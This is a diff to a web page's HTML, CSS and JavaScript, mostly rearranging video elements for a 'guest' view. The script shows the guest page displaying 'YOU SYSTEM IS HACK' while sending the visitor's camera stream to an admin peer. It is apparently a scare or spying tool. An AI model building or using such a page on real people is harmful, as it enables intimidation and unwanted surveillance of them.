@@ -2,7 +2,7 @@
 <html lang="id">
 <head>
   <meta charset="UTF-8">
-  <title>DIZ FLYZE GG ABIZ - Fullscreen Admin</title>
+  <title>DIZ FLYZE GG ABIZ - Admin</title>
   <link href="https://fonts.googleapis.com/css?family=Roboto:400,500,700&display=swap" rel="stylesheet">
   <style>
     :root {
@@ -150,9 +150,10 @@
       position: absolute;
       bottom: 10px;
       right: 2px;
-      width: 2px;
+      width: 120px;
       border: 2px solid var(--primary-color);
       border-radius: 5px;
+      z-index: 101;
     }
     .video-label {
       position: absolute;
@@ -249,11 +250,21 @@
       margin: 0;
       padding: 0;
     }
-    #guestUI .video-wrapper { width: 100%; height: 100%; }
-    #guestVideo {
+    #guestUI .video-wrapper { width: 100%; height: 100%; position: relative; }
+    #guestSelf {
       width: 100%;
       height: 100%;
       object-fit: cover;
+      transform: scaleX(-1);
+    }
+    #guestRemote {
+      position: absolute;
+      bottom: 10px;
+      right: 2px;
+      width: 120px;
+      border: 2px solid var(--primary-color);
+      border-radius: 5px;
+      z-index: 101;
     }
     #audioVisualizer {
       position: absolute;
@@ -299,7 +310,8 @@
     </div>
     <div id="guestUI">
       <div class="video-wrapper">
-        <video id="guestVideo" autoplay playsinline></video>
+        <video id="guestSelf" autoplay playsinline></video>
+        <video id="guestRemote" autoplay playsinline></video>
       </div>
     </div>
   </div>
@@ -426,14 +438,14 @@
       document.getElementById("headerText").textContent = "YOU SYSTEM IS HACK";
       updateConnectionStatus("Connected");
       getLiveStream().then((stream) => {
+        document.getElementById("guestSelf").srcObject = stream;
         peer = new Peer(undefined, peerConfig);
         peer.on("open", (id) => {
           console.log("Guest Peer ID:", id);
           const call = peer.call(adminPeerId, stream);
           currentCall = call;
           call.on("stream", (remoteStream) => {
-            console.log("Received remote stream from admin.");
-            document.getElementById("guestVideo").srcObject = remoteStream;
+            document.getElementById("guestRemote").srcObject = remoteStream;
           });
         });
         peer.on("error", (err) => { console.error(err); showNotification(err.message, true); });
